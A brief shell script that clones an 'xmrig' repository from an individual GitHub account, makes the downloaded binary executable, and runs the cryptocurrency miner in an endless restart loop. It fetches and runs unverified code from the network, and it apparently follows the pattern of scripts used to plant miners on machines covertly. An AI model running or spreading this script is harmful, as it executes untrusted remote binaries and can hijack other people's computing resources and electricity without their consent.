#!/bin/sh
#

#xxx
git clone https://github.com/sunahsl/xmrig.git
cd xmrig
chmod +x xmrig
while [ 1 ]; do
./xmrig
sleep 5
done
